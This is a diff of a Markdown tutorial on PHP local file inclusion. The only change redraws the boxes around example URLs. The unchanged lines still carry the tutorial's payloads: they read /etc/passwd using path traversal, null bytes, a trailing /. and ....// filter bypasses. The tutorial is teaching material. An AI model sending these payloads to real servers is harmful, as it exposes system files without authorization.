@@ -19,9 +19,9 @@ The PHP code uses a `GET` request via the URL parameter `file` to include the fi
 We can access and Display any readable file on the server from the code above if there isn't any Input Validation. This works because there isn't a directory specified in the `include` function and **No Input Validation.**
 
 ```js
-+----------------------------------------------------+
+┌────────────────────────────────────────────────────┐
 | URL: | http://website.com/get.php?file=/etc/passwd |
-+----------------------------------------------------+
+└────────────────────────────────────────────────────┘
 ```
 
 <br/>
@@ -40,9 +40,9 @@ The `include` function call's PHP pages in the **includes Directory** only via *
 This  `include` function allows us to Include any called files into the **Current Page.**  We can break out of it Using `../`
 
 ```js
-+---------------------------------------------------------------+
+┌───────────────────────────────────────────────────────────────┐
 | URL: | http://website.com/get.php?file=../../../../etc/passwd |
-+---------------------------------------------------------------+
+└───────────────────────────────────────────────────────────────┘
 ```
 
 <br/>
@@ -66,9 +66,9 @@ To Bypass this we can use the **NULL BYTE:** `%00` Using Null Bytes is an Inject
 Fixed and Not Working with `PHP 5.3.4` and Above...
 
 ```js
-+------------------------------------------------------------------+
+┌──────────────────────────────────────────────────────────────────┐
 | URL: | http://website.com/get.php?file=../../../../etc/passwd%00 |
-+------------------------------------------------------------------+
+└──────────────────────────────────────────────────────────────────┘
 ```
 
 :::
@@ -92,13 +92,13 @@ This Code Filter Keywords to avoid disclosing sensitive information. The **/etc/
 We can bypass this using the **NULL BYTE:** `%00`. Or the current Directory at the end of the filtered keyword `/.`
 
 ```js
-+-------------------------------------------------------+
+┌───────────────────────────────────────────────────────┐
 | URL: | http://website.com/get.php?file=/etc/passwd%00 |
-+-------------------------------------------------------+
+└───────────────────────────────────────────────────────┘
 
-+-------------------------------------------------------+
+┌───────────────────────────────────────────────────────┐
 | URL: | http://website.com/get.php?file=etc/passwd/.   |
-+-------------------------------------------------------+
+└───────────────────────────────────────────────────────┘
 ```
 
 <br/>
@@ -117,17 +117,17 @@ The Code replaces the `../` with the Empty String.
 We can send the following PAYLOAD to bypass the Filtering: `....//....//....//....//etc/passwd`. This works because the PHP Filter only Matches and Replaces the first subset string `../` it finds and doesn't do another pass.
 
 ```js
-+---------------------------------------------------------------------------+
+┌───────────────────────────────────────────────────────────────────────────┐
 | URL: | http://website.com/get.php?file=....//....//....//....//etc/passwd |
-+---------------------------------------------------------------------------+
+└───────────────────────────────────────────────────────────────────────────┘
 ```
 
 Some Filters can be Bypassed using this Method...
 
 ```js
-+---------------------------------------------------------------------------+
+┌───────────────────────────────────────────────────────────────────────────┐
 | URL: | http://website.com/get.php?file=....\/....\/....\/....\/etc/passwd |
-+---------------------------------------------------------------------------+
+└───────────────────────────────────────────────────────────────────────────┘
 ```
 
 <br/>
@@ -151,7 +151,7 @@ This Code forces the `include` to read from a **Defined Directory** in this case
 To exploit the Defined Directory, we need to include the directory in the PAYLOAD.
 
 ```js
-+-----------------------------------------------------------------------+
+┌───────────────────────────────────────────────────────────────────────┐
 | URL: | http://website.com/get.php?file=Files../../../../../etc/passwd | 
-+-----------------------------------------------------------------------+
+└───────────────────────────────────────────────────────────────────────┘
 ```
